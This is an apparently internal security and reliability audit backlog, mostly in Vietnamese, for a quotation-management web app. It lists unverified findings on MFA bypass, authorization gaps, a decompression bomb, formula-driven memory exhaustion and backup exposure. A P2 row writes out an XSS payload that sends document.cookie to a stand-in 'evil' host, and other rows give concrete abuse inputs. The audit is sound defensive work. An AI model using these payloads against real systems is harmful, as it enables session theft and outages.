# Rủi ro còn lại — việc chưa làm

Lập ngày 2026-08-26, từ một đợt rà soát toàn bộ mã nguồn (12 mảng, chạy song song
bằng nhiều tác nhân đọc mã thật).

> ## Đọc kỹ trước khi hành động
>
> **Những mục dưới đây CHƯA ĐƯỢC XÁC MINH ĐỘC LẬP.** Đây là kết quả **một lượt
> đọc**, chưa có ai phản biện lại.
>
> Kinh nghiệm ngay trong chính đợt này cho thấy tỉ lệ nhầm là có thật: vài phát
> hiện hoá ra là lỗi tiềm ẩn không với tới được, vài phát hiện khác thì mức độ bị
> thổi lên. **Hãy TÁI HIỆN trước khi sửa.** Đừng mở PR dựa vào bảng này.
>
> Những mục ĐÃ được tôi tự tái hiện và ĐÃ VÁ thì không có trong đây — xem lịch sử
> commit của nhánh này.

## ⚠️ Bốn thứ PHẢI đọc trước khi tin nhánh này ở production

(Ba việc còn phải làm, cộng một ghi chép về lớp lỗi đã vá — mục 4.)

Cả bốn đều là hệ quả TRỰC TIẾP của các bản vá trong chính nhánh này. Chúng không
phải lỗi có sẵn — chúng là chỗ bản vá đi xa hơn mức đã đo được.

### 1. Trần RAM container là số PHỎNG ĐOÁN, chưa đo trên VM thật

`docker-compose.prod.yml` / `.staging.yml` nay đặt `deploy.resources.limits.memory`
(app 1536m, worker 2g). **Chưa ai đo đỉnh RSS thật.**

Đặt cgroup limit mà không bảo V8 biết là tự bắn vào chân: Node không đọc cgroup
limit để chỉnh heap, nó nới theo RAM của **host** rồi bị kernel SIGKILL nguyên
container. Lúc đó không phải một request hỏng — mà mọi request đang bay của mọi
người đứt, SSE đứt, lần Lưu báo giá đang gửi dở mất trắng.

Đã giảm nhẹ bằng `NODE_OPTIONS=--max-old-space-size` ở ~70% trần, để V8 GC gắt rồi
ném heap-OOM **bắt được** (hỏng đúng một request) thay vì để kernel giết container.
Nhưng đó là lưới an toàn, không phải phép đo.

**Việc phải làm:** chạy `docker stats` trên VM một tuần, xem đỉnh RSS thật khi xuất
báo giá lớn nhất, rồi thay hai con số đó bằng số đo được. Repo còn đường tiêu bộ
nhớ chưa chặn (nhập Excel nạp cả workbook trên event loop), nên số đo phải lấy ở
tình huống xấu nhất, không phải ngày thường.

### 2. `infra/k8s/backup-objects-cronjob.yaml` CHƯA TỪNG CHẠY THẬT

File này mới chỉ qua `kubeconform` — chỉ kiểm hình dạng YAML, không kiểm ảnh
`minio/mc` có sẵn lệnh mà script dùng hay không. Ảnh đó dựng trên UBI-micro, cắt
rất sâu. Bản đầu dùng `find -printf` (GNU-only) và `xargs`; với `set -e`, một lệnh
không tồn tại là job chết lúc 02:30 — không ai thấy, và đội vận hành vẫn tin rằng
**chứng từ tài chính đã có bản sao lưu**.

Đã viết lại để mọi thao tác liệt kê/xoá đều qua chính `mc`, và đặt
`HOME=/tmp` + `MC_CONFIG_DIR=/tmp/.mc` (pod chạy `readOnlyRootFilesystem` nên `mc`
không ghi nổi config ở `$HOME` mặc định). Nhưng `sha256sum`, `sed`, `sort`, `wc`,
`tr` thì **vẫn chưa xác minh được** — sandbox không có Docker daemon.

**Việc phải làm:** `kubectl create job --from=cronjob/quanly-object-backup thu-1`
trên kind/minikube, đọc log, xác nhận kết thúc bằng `OBJECT_BACKUP_DONE` và
`manifest_*.tsv` có nội dung, rồi **diễn tập khôi phục từ bản gương đó**.

**Cho tới lúc đó: nhánh đang chạy thật là docker-compose +
`scripts/backup/backup-objects.sh`.** Đừng ghi ở đâu rằng k8s đã sao lưu kho object.


### 3. Nhập Excel: đã rời event loop, nhưng CHƯA có hàng rào bộ nhớ thật

`POST /api/quotes/import-excel` nay đọc workbook trong **worker thread** — điều này
đã đo được (`tests/import-worker-thread.test.js` đo độ trễ event loop trong lúc
worker chạy). Server không còn đứng khi ai đó nhập file nặng.

**Nhưng trần bộ nhớ thì chưa có thật.** Tôi đặt
`resourceLimits.maxOldGenerationSizeMb` rồi **đo lại**, và nó KHÔNG chặn: với trần
32MB, một worker vẫn cấp phát thoải mái `Buffer.alloc(300MB)` và ba triệu object.
Buffer là bộ nhớ ngoài heap V8, còn old-space thì V8 co giãn theo cách riêng.

Hàng rào thật hiện nay chỉ là **trần tải lên 10MB** (multer) cộng **timeout 30s**.
Mà `.xlsx` là ZIP: 10MB nén bung ra hàng trăm MB.

**Việc phải làm:** đọc theo LUỒNG bằng `exceljs.stream.xlsx.WorkbookReader` thay cho
`workbook.xlsx.load()`, để `MAX_SHEETS` / `MAX_SCAN_ROWS` có tác dụng **trong lúc**
đọc chứ không phải sau khi đã dựng xong cả workbook trong RAM. Đó là thay đổi lớn
hơn một lượt vá và cần bộ test round-trip Excel chạy kèm từng bước — nên chưa làm.

**Đừng ghi ở đâu rằng trần heap của worker bảo vệ được gì.**

### 4. Worker thread TỪNG không chạy ở dev/test suốt thời gian dài

Không phải rủi ro còn mở — đã vá — nhưng đáng ghi lại vì nó cho thấy một lớp lỗi:
**đường lui im lặng che mất việc đường chính chưa bao giờ chạy.**

`new Worker(new URL("./exportWorker.js", import.meta.url))` chạy tốt ở production
(image chỉ chứa `dist/`, mọi thứ là `.js`) nhưng **luôn hỏng** ở dev/test — `npm run
dev` là `tsx src/server.ts`, mà worker thread KHÔNG kế thừa loader của tsx, nên
`./excel.js` không giải được (trên đĩa chỉ có `excel.ts`). `runExportJob` bắt lỗi,
ghi một dòng `warn`, rồi rơi về chạy **nội tuyến trên luồng chính** — đúng thứ mà
worker sinh ra để tránh. Bộ test vẫn xanh vì đường lui cho kết quả đúng.

Nay cả hai worker tự đăng ký loader tsx khi chạy từ nguồn. Bài học: **một đường lui
tự động che được việc đường chính chưa bao giờ hoạt động.** Khi thêm đường lui, hãy
thêm luôn cách nhìn thấy nó đang được dùng.

Đúng lớp lỗi đó lặp lại một lần nữa ở tiến trình worker BullMQ, và cũng đã vá trong
nhánh này: processor xuất nền gọi thẳng `buildQuoteBuffer` nên **không đi qua trần
thời gian nào**, trong khi ân hạn dừng 90s của k8s/Helm/compose lại tự xưng neo vào
trần đó (xem mục "Ân hạn dừng worker = 90s" bên dưới). Cách vá lấy luôn bài học ở
trên: `sinhFileXuat` đặt `choPhepNoiTuyen: false`, tức **bỏ hẳn đường lui** trên
nhánh cần một cái trần thật — vì một đường lui không có trần thì vô hiệu hoá đúng
cái trần vừa đặt, và lại làm nó im lặng.

## Ưu tiên đề xuất

1. **Xoay mật khẩu demo trên dev/staging.** Chuỗi cũ đã bị gỡ khỏi cây làm việc
   nhưng **vẫn còn trong lịch sử git của một repo công khai**. Gỡ file không thu
   hồi được nó. Đây là việc phải làm bằng tay, không code nào làm thay được.
2. Nhóm P0/P1 về **đường lưu báo giá** — chúng đụng tới dữ liệu tiền và trạng
   thái duyệt, tức là chỗ mất mát khó phát hiện nhất.
3. Nhóm P1 về **hàng đợi/worker** — ảnh hưởng độ tin cậy của xuất file và job nền.
4. Phần còn lại theo thứ tự thuận tiện.

## Cách đọc bảng

`id` là định danh nội bộ của phát hiện, dùng để tra lại trong ghi chép rà soát.
Cột "hệ quả nếu đúng" là lập luận của người rà soát, **chưa kiểm chứng**.


## P1 — 27 mục

| Mục | Vấn đề | Hệ quả nếu đúng |
|---|---|---|
| `reset-bypasses-mfa` | Password reset (/accept-invite) auto-logs the user in and skips the MFA gate entirely | An attacker who controls (or has transient access to) a victim's mailbox — the exact threat model TOTP is deployed against — POSTs /api/auth/forgot-password, opens the emailed link, POSTs /a… |
| `quote-versions-bypass-hn-internal-projection` | account_hn / internal:view đọc TOÀN BỘ báo giá (giá bán + khách hàng) qua endpoint /versions — projection hnOnly/internalOnly không áp ở đây | Manager giao báo giá GN26043 cho tài khoản Account Hà Nội (POST /api/quotes/:id/hn/assign) → account thành member. Account đó gọi `GET /api/quotes/43/versions` nhận về `total` từng phiên bản… |
| `savehn-no-body-schema-forges-payment-state` | PUT /api/quotes/:id/hn không validate body → account_hn tự giả mạo paid/paidAt/paidById + nhét ảnh chứng từ không giới hạn kích thước vào bảng nội bộ | Account Hà Nội được giao báo giá 43, gửi PUT /api/quotes/43/hn với body {"hnSheets":[{"sheetId":9,"hnTables":[{"items":[{"name":"Thi công","unitPrice":5000000,"rid":"r1","paid":true,"paidAt"… |
| `hn-write-guard-uses-role-string-not-permission` | Chốt chặn 'người điền HN không được sửa báo giá chính' kiểm ROLE cứng `account_hn`, trong khi cả hệ (backend lẫn frontend) đã chuyển sang quyền quote:hn:fill cấp được per-user | Giám đốc dùng trang Phân quyền cấp cho một nhân viên vai trò `manager` (hoặc `accountant`) các quyền quote:hn:fill + quote:read:own + quote:update:own để họ điền giá Hà Nội — đúng con đường … |
| `sheetname-breaks-xlsx-export` | Tên sheet do người dùng gõ làm hỏng hoặc chặn hẳn việc xuất Excel (3 trường hợp, đã xác minh chạy thật) | Người dùng đặt tên sheet là "Booth/Backdrop" (dấu / rất tự nhiên) cho báo giá 1 sheet → GET /api/export/:id.xlsx ném lỗi ở src/excel.ts:1360 → asyncHandler đẩy lên errorHandler → 500 kèm thô… |
| `import-xlsx-oom-eventloop` | Nhập Excel: toàn bộ workbook được nạp vào RAM TRÊN EVENT LOOP trước khi mọi trần MAX_SHEETS/MAX_SCAN_ROWS có tác dụng — treo server + OOM | Một tài khoản có quyền quote:create tải lên file .xlsx 3 MB gồm 150k dòng: Node đơn luồng đứng im 5 giây (mọi request khác — SSE, lưu báo giá của người khác — treo theo), RSS +1 GB. importLi… |
| `decompressbody-before-auth` | decompressBody chạy TRƯỚC auth và TRƯỚC rate-limit, không có trần tỉ lệ nén → khuếch đại bộ nhớ ~1000× cho người CHƯA đăng nhập | Kẻ tấn công KHÔNG có tài khoản gửi `POST /api/quotes` với `Content-Encoding: gzip` và ~16 KB dữ liệu toàn số 0 (gzip nén ~1000×). Server bung ra 16 MB + `Buffer.concat` → ~32 MB đỉnh mỗi req… |
| `version-snapshot-copies-base64-proofs` | Mỗi lần Lưu chép TOÀN BỘ ảnh chứng từ base64 trong extraTables vào QuoteVersion.payload | Một dự án có 10 hàng nội bộ đã đính ảnh chứng từ (10 × ~900KB = ~9MB extraTables). Người phụ trách sửa báo giá 30 lần trong vòng đời dự án → 30 bản QuoteVersion × 9MB = ~270MB jsonb cho MỘT … |
| `tx-no-timeout-config` | Interactive $transaction dùng mặc định 5s/2s — đường Lưu báo giá lớn chắc chắn vượt | Báo giá 50 sheet × 200 dòng (kích thước đã đo trong `PERFORMANCE_AUDIT.md:87` = 1.581 KB payload, 10.000 hàng): một transaction phải DELETE 50 sheet (cascade 10.000 QuoteItem), INSERT lại 10… |
| `customer-taxcode-no-unique` | Chống trùng Mã số thuế khách hàng chỉ có ở tầng app — DB không có UNIQUE, hai request song song lọt | Hai nhân viên cùng nhập một công ty mới (hoặc một người bấm Lưu hai lần do mạng chậm): cả hai request chạy `findFirst({where:{taxCode}})` trước khi request nào kịp INSERT → cả hai thấy `null… |
| `bullmq-export-blocks-worker-loop-stalls` | Async export processor runs exceljs/PDF on the BullMQ worker's main event loop → lock expiry, stalled re-delivery, duplicate exports | A user hits the 413 at export.routes.ts:67 on a 100-sheet / 20 000-item quote and follows the message to POST /api/quotes/:id/export. The worker picks it up and blocks its event loop inside … |
| `export-returnvalue-base64-in-redis` | Export job result embeds the whole file as base64 in Redis and is retained for 1000 completed jobs on a 256 MB noeviction Redis | With no S3 configured (the shipped default), each async export of a 5 MB xlsx writes ~6.7 MB of base64 into Redis and keeps it for the next 1000 completions. Roughly 40 exports exhaust the 2… |
| `redis-allkeys-lru-evicts-bullmq-jobs` | Helm/k8s (and local) Redis run maxmemory-policy allkeys-lru — BullMQ job keys can be evicted silently; only the compose files were fixed | Under the 256 MB cap (guaranteed to be reached given the base64 returnvalue issue above), `allkeys-lru` evicts arbitrary keys — including a queue's `wait` list, a job hash, or the `meta` key… |
| `api-shutdown-never-drains-sse` | API graceful shutdown can never complete because SSE connections stay open — every deploy hard-exits with code 1 and kills in-flight exports | On every rolling update, SIGTERM arrives, `server.close()`'s callback never fires because ≥1 SSE client is connected (in practice always — every logged-in React tab holds one, web/src/compon… |
| `hn-save-unvalidated-body` | PUT /api/quotes/:id/hn has no body schema — account_hn can forge paid / paidById / paidProof on internal rows, bypassing quote:internal:pay | An account_hn user assigned to a quote POSTs `{"hnSheets":[{"sheetId":12,"hnTables":[{"items":[{"name":"Thi công","unitPrice":50000000,"paid":true,"paidById":1,"paidProof":"data:image/png;ba… |
| `optimistic-lock-advisory-and-racy` | Optimistic concurrency check is opt-in (legacy SPA omits it → silent overwrite) and is a TOCTOU even when sent | (a) Two managers open the same quote in the React editor at t0. Both press Lưu within the ~50-200 ms window between :254 (read) and :329 (transaction start). Both read the same `existing.upd… |
| `legacy-save-destroys-sheet-carry` | A save from the legacy /app editor wipes invoiceNo / paidAt / signedAt / custStatus on every sheet as soon as a sheet is added, removed or its template changes | A converted project has sheet 1 with invoiceNo "HD-2026-0412", invoiceDate, paidAt and a signature. Someone opens it at /app (the fallback UI), deletes an obsolete sheet 3 and saves. `list.l… |
| `hanoi-tables-unprotected-on-main-save` | Approved Hà Nội prices can be rewritten through the ordinary quote save, bypassing the hn approval state machine entirely | A manager assigns the Hà Nội part, the account fills it (5.000.000 đ), submits, the manager approves → hnStatus="approved", hnReviewedAt stamped. Any member with quote:update:own on that quo… |
| `savehn-lost-update` | saveHn does a stale read-modify-write of the extraTables JSON with no row lock and silently no-ops when sheet ids have changed | (a) Lost update: kế toán marks an HCM row paid via /extra/:sheetId/:rid/pay at t1 (it takes FOR UPDATE, writes extraTables, commits). The account_hn user loaded the quote at t0 and presses L… |
| `formula-ref-expansion-oom` | refsInFormula expands a cell range into one object per row with no bound — a 20-character stored formula OOMs the export and aborts the Node process | Any user with quote:create types `=SUM(H1:H999999999)` into a Đơn Giá cell (the editor accepts it; the value stored is just a string) and saves. The quote saves fine. The next time anyone ex… |
| `plaintext-pii-columns-still-authoritative` | Plaintext PII columns are still written on every request and there is no executable cutover — the stated threat (leaked DB dump) is not mitigated at all | The entire justification for this subsystem (src/piiBox.ts:1-2, "dành cho các trường có sức sát thương cao nhất nếu bản dump CSDL bị lộ") is currently unrealised: `backup-db.sh` produces a d… |
| `no-pii-key-rotation-path` | Key rotation is documented in the DR runbook but not implementable — no old-key support, no key id in the ciphertext, and backfill skips already-encrypted rows | An operator who suspects PII_ENC_KEY leaked follows the runbook: sets the new key, runs `npm run pii:backfill`. The script prints `còn 0` (every row has piiVersion=1) and exits 0 — a green r… |
| `prod-deploy-bypasses-supply-chain` | Prod build image NGAY TRÊN VM — toàn bộ chuỗi cung ứng của CI (smoke image, SBOM, digest) bị bỏ qua | Deploy prod ngày 2026-08-25 từ ref X: image chạy ở gianguyen.cloud được dựng lại trên VM từ `git archive X`, không phải image mà CI đã smoke-test. Nếu VM có cache layer khác, npm registry tr… |
| `reset-invite-token-in-logs` | Token đặt lại mật khẩu / mời tài khoản bị ghi nguyên văn vào log ứng dụng (nằm trong URL path) | Người dùng bấm link reset trong email → SPA gọi GET /api/auth/invite/<token> → dòng log `{"url":"/api/auth/invite/9f3c..."}` nằm trong stdout container, được Coolify/Docker giữ lại và (nếu c… |
| `redis-down-disables-all-limiters` | Redis chết → bỏ qua TẤT CẢ limiter, không chỉ limiter đăng nhập; các limiter khác không có lớp chặn dự phòng nào | Redis restart (nâng cấp, OOM do maxmemory 256mb + noeviction ở docker-compose.prod.yml:33-35) là sự kiện bình thường. Trong cửa sổ đó, một phiên admin bị đánh cắp kéo được `/api/admin/backup… |
| `session-401-discards-unsaved-quote` | Bất kỳ 401 nào (kể cả heartbeat presence 30s) cũng gỡ editor và mất TOÀN BỘ báo giá chưa lưu, không cảnh báo | Sale đang sửa báo giá 40 sheet × vài trăm dòng trong 30 phút. Admin khoá/mở lại tài khoản, hoặc chính người đó đổi mật khẩu ở máy khác, hoặc đăng nhập lại ở tab thứ hai. Nhịp heartbeat prese… |
| `catalog-insert-breaks-formulas` | "Chèn từ rạp" chèn hàng mà KHÔNG dịch tham chiếu công thức → công thức phía dưới lặng lẽ trỏ sai hạng mục (sai tiền) | Sheet có "=SUM(H10:H14)" ở hàng nhóm 15 và "=E20*G20" ở hàng 20. Người dùng đứng ở hàng 5 bấm "📐 Chèn từ rạp" chọn 6 hạng mục. 6 hàng được chèn vào vị trí 6..11; hạng mục cũ ở hàng 10-14 nay… |

## P2 — 74 mục

| Mục | Vấn đề | Hệ quả nếu đúng |
|---|---|---|
| `lockout-counter-never-resets` | failedAttempts is never cleared when a lockout expires — after one lockout, every single wrong password re-locks the account for 15 minutes | After a user's first lockout the stored counter stays at 5 forever. The 16th minute, one wrong keystroke takes it to 6 ≥ 5 → `lockedUntil` is set again for another 15 minutes. A legitimate u… |
| `backup-codes-40-bit-unsalted-sha256` | MFA backup codes are 40-bit values stored as unsalted SHA-256 — trivially recovered from any DB dump, and the app ships a DB-dump endpoint | 2^40 ≈ 1.1e12 candidates; commodity GPU SHA-256 runs ~1e10/s, so each stored digest inverts in roughly a minute or two, and the search is shared across all users because there is no per-user… |
| `refresh-rotation-ignores-lock-and-never-ages-out` | Refresh rotation re-issues tokens for a locked account and the token family has no absolute lifetime (sliding 7 days, forever) | (a) Lockout is meant to stop an in-progress attack, but an attacker holding a refresh token keeps minting fresh 15-minute access tokens throughout the lockout window; each one is rejected by… |
| `paidproof-prefix-only-dataurl` | Quote internal-row payment proof accepts a PREFIX-ONLY data-URL regex and is stored + served back verbatim, violating the codebase's own documented anti-XSS rule | Concrete failure: a user holding `quote:internal:pay` POSTs `paidProof = 'data:image/png;base64,AAAA" onerror="fetch(`//evil/?c=${document.cookie}`)'`. Zod accepts it (prefix matches), quote… |
| `employee-directory-own-scope-not-enforced` | Danh bạ nhân sự: quyền employee:read/edit/delete:own KHÔNG lọc theo chủ sở hữu — mọi manager sửa/xoá được mục của người khác, và ai được tick 'Xem danh bạ của mình' đọc được CCCD + số tài khoản của TẤT CẢ | (a) Mặc định: manager A thêm 5 nhân công vào danh bạ; manager B (cũng vai trò manager) gọi DELETE /api/employees/<id-của-A> → xoá mềm được, hoặc PUT đổi số tài khoản ngân hàng của người khác… |
| `extra-table-pay-proof-no-quote-scope` | POST /:id/extra/:sheetId/:rid/pay và GET .../proof chỉ kiểm quyền năng lực, không kiểm quyền với báo giá :id → ghi/đọc chéo mọi báo giá theo id tuần tự | Tài khoản 'chi phí' được cấp quote:internal:view + quote:internal:pay + quote:read:own (đúng cấu hình tối thiểu để trang nội bộ chạy). Họ chỉ nhìn thấy các báo giá mình là member trong danh … |
| `endpoint-inventory-cannot-detect-unguarded-route` | scripts/endpoint-inventory.mjs (chốt CI được coi là 'gác ma trận phân quyền') KHÔNG phân tích middleware — nó chỉ so MỘT con số tổng, nên một route mutation không gác quyền vẫn qua CI xanh | NHỮNG GÌ NÓ BẮT ĐƯỢC: route khai bằng literal trên `app.<method>(...)` trong src/app.ts và trên `router.<method>(...)` trong file được import đúng dạng `import X from "./routes/<tên>.js"` rồ… |
| `neutralize-apostrophe-visible` | neutralizeFormula để lọt dấu nháy ' vào file gửi khách với mọi hạng mục bắt đầu bằng "-" hoặc "+"; đồng thời bỏ sót khoảng trắng đứng trước = | Tên hạng mục tiếng Việt rất hay bắt đầu bằng gạch đầu dòng ("- Banner mặt tiền", "+ Phụ kiện") — mọi dòng như vậy in ra file .xlsx gửi khách hàng kèm một dấu nháy lạ ở đầu. Đây là tài liệu c… |
| `docx-control-chars` | contractDocx: escXml không lọc ký tự điều khiển → word/document.xml không hợp lệ, Word từ chối mở hợp đồng | Một hồ sơ nhân sự có ký tự điều khiển lọt vào (dán từ PDF/Word, xuất từ hệ thống khác, hoặc gọi API trực tiếp với  trong JSON) khiến GET /api/personnel/:id/contract trả về HTTP 200 với một … |
| `pdf-rowheight-ignores-wrap` | PDF: chiều cao hàng chỉ đếm ký tự xuống dòng, bỏ qua việc chữ tự wrap theo bề rộng cột → tên hạng mục dài đè lên các hàng dưới | Một hạng mục có tên dài (rất bình thường: "Booth backdrop khu vực trung tâm … (thay AW booth có sẵn)") in ra PDF sẽ đè chồng lên tất cả các dòng bên dưới — bảng báo giá không đọc được. Với t… |
| `audit-retention-missing-createdat-index` | AuditEvent/LoginAttempt/WebhookDelivery thiếu index dẫn đầu bằng createdAt — trang Nhật ký + job dọn đều seq-scan | Ba bảng này là append-only, ghi mỗi thao tác (`src/audit.ts:26-37` gọi ở mọi create/update/delete) nên là bảng lớn nhất hệ thống sau ~2 năm giữ (`src/retention.ts:10` `AUDIT_DAYS = 730`). Mở… |
| `quote-counter-lock-across-heavy-tx` | Khoá hàng QuoteCounter được giữ suốt transaction tạo báo giá (gồm ghi 60k dòng + snapshot) | Toàn công ty dùng chung một prefix (`Company.quotePrefix`, mặc định "GN" — `prisma/schema.prisma:328`), nên MỌI lượt tạo báo giá tranh cùng một hàng QuoteCounter. Hai người bấm "Tạo báo giá"… |
| `bulk-tags-n-writes-no-transaction` | Gắn từ khoá hàng loạt: tới 1000 UPDATE tuần tự, KHÔNG transaction — lỗi giữa chừng để lại trạng thái nửa vời | Chọn 300 rạp rồi đặt một từ khoá nhóm: 300 round-trip tuần tự (không `Promise.all`, không `updateMany`) — mỗi round-trip ~2-5ms qua mạng nội bộ là 0,6-1,5s chỉ để gắn nhãn, và request có thể… |
| `merge-venue-n-plus-1-in-tx` | Gộp rạp: 1 UPDATE/DELETE cho MỖI hạng mục bên trong interactive transaction 5s | Gộp một rạp có 200 hạng mục trùng tên khác cách gọi (đúng ca mà chú thích ở dòng 169-170 mô tả: "sheet gốc gọi cùng một rạp bằng nhiều tên") phát sinh tới 400 round-trip tuần tự trong một tr… |
| `schema-drift-plain-btree-indexes` | Hai index btree thường tồn tại trong DB nhưng không khai báo trong schema.prisma và KHÔNG nằm trong danh sách drift đã được ghi nhận | Lần tới ai chạy `npm run db:migrate` (`prisma migrate dev`), Prisma diff shadow-DB (đã có 2 index này) với `schema.prisma` (không có) → sinh migration chứa `DROP INDEX "QuoteSheet_custStatus… |
| `gdpr-export-unbounded-memory` | Xuất dữ liệu GDPR kéo 1000 báo giá KÈM toàn bộ items/ảnh base64 rồi JSON.stringify + JSON.parse | Giới hạn ảnh mỗi item là 10 ảnh × 2.800.000 ký tự (`src/validators.ts:147-149`). Một tài khoản kỳ cựu có 1000 báo giá; chỉ cần trung bình 200KB ảnh/báo giá là 200MB rows. `JSON.stringify` dự… |
| `hn-internal-list-pulls-base64-proofs` | Danh sách báo giá cho tài khoản HN/nội bộ select nguyên extraTables — kéo cả ảnh chứng từ base64 của cả trang | Một tài khoản kế toán chi phí có `quote:read:all` + `quote:internal:view` mở trang danh sách với size=100: server SELECT jsonb extraTables của mọi sheet thuộc 100 báo giá, trong đó có ảnh ch… |
| `projectref-recomputes-from-items` | buildProjectRef kéo TOÀN BỘ QuoteItem của tới 1000 báo giá để tính lại subtotal đã được materialize | Mở trang Nhân sự (mặc định size=50 — `src/routes/personnel.routes.ts:51`) sinh tới ~200 mã ứng viên (`projectRef.ts:38-46` nhân 4 biến thể mỗi mã) → truy vấn kéo về tới 1000 báo giá kèm MỌI … |
| `update-quote-triple-full-read` | Một lần Lưu báo giá đọc toàn bộ sheets+items (kèm ảnh base64) BA lần | Với báo giá có cột "Hình ảnh" bật (`QuoteSheet.showImages`), mỗi item mang tới 10 ảnh base64 × 2.8MB (`src/validators.ts:147-149`). Một lần bấm Lưu kéo khối đó qua dây DB ba lượt, hai trong … |
| `export-gate-no-abort-no-deadline` | Export gate is bounded now, but queued waiters cannot be cancelled and have no wait deadline — abandoned requests still pin memory and burn CPU | Worst case a waiter sits behind 20 queued × 3 concurrent × 30 s ≈ 200 s. Cloudflare gives up at ~100 s, the user closes the tab — but the request object, the original Prisma quote AND its `p… |
| `gate-rejection-not-counted` | The primary backpressure rejection (503 export_capacity) is never counted — the metric only covers the fallback path | `runExportJob` (exportQueue.ts:133) always goes through the gate first, so in production essentially every capacity rejection comes from line 53 and none from line 81 — the inline chain is o… |
| `no-bullmq-metrics-worker-unscraped` | Zero metrics on the BullMQ queues, and the worker process exposes no /metrics endpoint at all so its counters are never scraped | Every metric the worker produces — `export_jobs_total{status="error"}`, default process metrics, memory — is written to a registry no one ever reads and discarded when the pod restarts. Comb… |
| `sse-no-backpressure-no-connection-cap` | SSE writes ignore socket backpressure and there is no per-user connection cap — a black-holed or scripted client grows app memory without bound | Two concrete paths. (a) A laptop lid closes / a mobile client drops off a NAT without sending FIN. The connection stays in `subscribers` indefinitely; every `emitChange` from every quote sav… |
| `sse-backplane-silent-degradation` | SSE Redis backplane can be absent or broken with no signal, and its publisher uses the infinite-retry options the codebase elsewhere documents as dangerous | With replicaCount 2, a failed or not-yet-ready backplane means a notification created on pod-1 (src/notifications.ts:71 `publish(userId, "notification", ...)`) and, more seriously, a `sessio… |
| `no-job-idempotency-no-async-export-limit` | No jobId/idempotency key on any enqueue, and the async export route has neither a dedicated rate limit nor a size cap | The async export route sits behind only the generic 120/min per-IP api limiter (src/app.ts:250-256). A user double-clicking "xuất nền", or the SPA retrying a POST whose response was lost, pr… |
| `uniform-job-options-across-queues` | One defaultJobOptions for five queues with different risk profiles; retention is count-only with no age bound, and maintenance inherits 3 retries | (a) Retention is count-only, so a queue that starts failing on a Friday keeps 5000 job payloads per queue in Redis indefinitely with no age ceiling — on the 256 MB instance, webhook payloads… |
| `save-tx-default-5s-timeout` | The whole delete-all/reinsert + full re-read + version snapshot runs in one interactive transaction with Prisma's default 5 s timeout — large quotes cannot be saved at all | For the owner-stated real workload of 50 sheets × 500 rows = 25,000 items, ONE save of a single changed cell writes: 50 QuoteSheet DELETEs + 25,000 cascaded QuoteItem DELETEs + 50 QuoteSheet… |
| `version-snapshot-copies-base64-proofs` | Every save copies extraTables verbatim — including base64 payment-proof images — into a new QuoteVersion row | A project with 20 internal rows that each have a receipt photo carries ~18 MB of base64 in QuoteSheet.extraTables. Every price-affecting save bumps currentVersion (src/services/quoteService.… |
| `counter-row-locked-for-whole-create` | The quote-number counter row is held locked for the entire create transaction, serialising all quote creation behind the slowest write | Two people create quotes for the same company at the same time — say both importing a large Excel (50 sheets). A grabs the GN/2026 counter row and holds it while writing ~25,000 items and a … |
| `hn-route-guard-by-role-not-permission` | PUT /api/quotes/:id blocks the account_hn ROLE while the response presenter gates on the quote:hn:fill PERMISSION — a per-user grant slips through the block | An admin grants quote:hn:fill to a manager per-user (a supported flow — the Phân quyền page and listHnAccounts both expect it) without changing their role. That manager now gets the HN-only … |
| `backup-files-world-readable` | DB dumps containing every CCCD/bank account/salary are created 0644 in a 0755 directory, contradicting the runbook's own claim | Any non-root local account or any container that bind-mounts a parent path on the Coolify host can `cat /opt/quanly-backups/quanly-*.sql.gz` and read the complete personnel database in clear… |
| `nas-password-in-process-table` | NAS_PASS is interpolated into a docker run argv, exposing it in the host process table on every backup | Any local user on the Coolify host running `ps aux` during the 02:00/02:30 window (or `docker inspect` on the transient container) reads the SMB credential for the Synology share that stores… |
| `object-mirror-count-check-silently-skipped` | backup-objects.sh's bucket↔mirror completeness check is silently skipped whenever `mc ls` fails | `mc mirror` (line 68) can succeed partially — e.g. it transfers what it can and returns 0 after a mid-run credential expiry or a transient endpoint error — while a subsequent `mc ls` fails o… |
| `orphan-staging-objects-never-deleted` | Abandoned presigned uploads leave their staging objects in the bucket forever — retention deletes the DB row but never the object | A client that calls /sign-upload, PUTs up to 10 MB (files.routes.ts:18 MAX_UPLOAD_BYTES) and never calls /finalize leaves that object under `uploads/staging/uN/...` permanently. Twenty such … |
| `exports-objects-never-pruned` | Every quote export is written to the bucket and never deleted — unbounded growth, now amplified into every backup | Every re-export of the same quote mints a new timestamped object (the key includes `Date.now()`), so a quote exported 50 times leaves 50 objects. Since 2026-08-11 the bucket is mirrored dail… |
| `restore-drill-fills-production-volume` | Weekly restore-test/restore-drill create a full second copy of the production DB inside the production Postgres container with no disk-space precheck | Both timers fire on Sunday (install-backup.sh:92-93: restore-test 03:00, restore-drill 03:30) and each materialises a full copy of the production database on the same volume as production da… |
| `k8s-backup-path-incomplete` | The k8s/Helm deploy path has no PII key, no object-storage backup, and its DB CronJob writes non-atomically with no verification | Three separate failures. (a) A deploy from secret.example.yaml crash-loops immediately on config.ts:110. (b) If someone adds MFA_ENC_KEY but not PII_ENC_KEY and points the pod at the existin… |
| `helm-redis-password-default-unguarded` | redis.password mặc định `CHANGE_ME_INTERNAL_REDIS` render thẳng ra production, không có guard như SESSION_SECRET | `helm upgrade --install` mà quên `--set redis.password=...` vẫn thành công và cụm chạy với mật khẩu Redis in trong repo. Redis ở đây giữ session đăng nhập + hàng đợi BullMQ, nên biết mật khẩ… |
| `dockerignore-misses-nested-node-modules` | .dockerignore chỉ loại `node_modules` gốc — web/node_modules (153 MB) lọt vào build context và vào tầng webbuild | Mỗi lần `docker compose -f docker-compose.prod.yml build app` (deploy.sh:46, chạy TRÊN VM prod qua SSH) phải nén + truyền + lưu thêm 153 MB context và một layer 153 MB rác trước khi npm ci x… |
| `prod-compose-no-container-hardening` | Compose prod/staging — đường deploy THẬT — không có read_only / cap_drop / no-new-privileges, trong khi k8s và Helm đã siết hết | Prod thật sự chạy bằng compose (deploy.sh:23 `COMPOSE=docker-compose.prod.yml`), k8s/Helm mới là dự phòng. Nghĩa là lớp hardening duy nhất đang được kiểm ở CI (kubeconform, helm template) lạ… |
| `prod-compose-no-resource-limits` | Compose prod/staging không giới hạn RAM/CPU cho service nào — một job export chạy loạn hạ cả VM kể cả Postgres | Worker prod chạy exceljs + pdfkit + xlsxStitcher trên workbook nhiều sheet trong bộ nhớ (upload dùng memoryStorage). Một báo giá bất thường lớn → worker leo RAM không trần → OOM killer của k… |
